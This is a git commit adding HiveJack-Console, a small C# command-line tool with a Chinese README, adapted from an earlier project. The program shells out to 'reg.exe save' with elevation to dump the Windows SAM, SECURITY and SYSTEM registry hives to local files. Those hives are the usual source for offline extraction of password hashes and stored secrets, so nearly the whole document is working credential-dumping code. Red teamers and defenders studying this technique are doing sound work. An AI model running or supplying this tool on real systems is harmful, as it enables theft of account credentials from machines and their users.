8098a611f82ec258e869e35acb6935d0cbb362b8
DeEpinGh0st <1510536500@qq.com>
2020-06-16 11:12:07 +0800

    first commit

---
+++ Program.cs
@@ -0,0 +1,66 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+
+namespace HiveJack_Console
+{
+    class Program
+    {
+        private static string helper = "sam    dump SAM registry hives.\nsecurity    dump SECURITY  registry hives.\nsystem    dump SYSTEM  registry hives.\nall    dump SYSTEM, SECURITY and SAM registry hives.";
+
+        private static void Dump(string type)
+        {
+            if (File.Exists(type + ".save"))
+            {
+                Console.WriteLine(String.Format("[-] {0}.save already exists.", type));
+            }
+            else
+            {
+                Process process = new Process();
+                process.StartInfo.Verb = "runas";
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = String.Format("/c reg.exe save hklm\\{0} {0}.save", type);
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+                process.Start();
+                string output = process.StandardOutput.ReadToEnd();
+                Console.WriteLine(output);
+                process.WaitForExit();
+            }
+        }
+        static void Main(string[] args)
+        {
+            Console.WriteLine("[*] ===HiveJack-Console===");
+            Console.WriteLine("[*] Original author:  Viralmaniar");
+            Console.WriteLine("[*] Adapted author: S0cke3t");
+            if (args.Length < 1)
+            {
+                Console.WriteLine("[-] Invalid argument!");
+                Console.WriteLine(helper);
+                Environment.Exit(0);
+            }
+            switch (args[0])
+            {
+                case "sam":
+                    Dump("sam");
+                    break;
+                case "security":
+                    Dump("security");
+                    break;
+                case "system":
+                    Dump("system");
+                    break;
+                case "all":
+                    Dump("sam");
+                    Dump("security");
+                    Dump("system");
+                    break;
+                default:
+                    Console.WriteLine("[-] Invalid argument!");
+                    Console.WriteLine(helper);
+                    break;
+            }
+        }
+    }
+}
---
+++ README.md
@@ -0,0 +1,5 @@
+## Hivejack的控制台版本，基于.net framework 2.0  
+###  该工具用于获取SAM,SECURITY,SYSTEM注册表配置单元信息  
+![](README_md_files/image.png?v=1&type=image)     
+###  原仓库地址  
+[HiveJack](https://github.com/Viralmaniar/HiveJack)
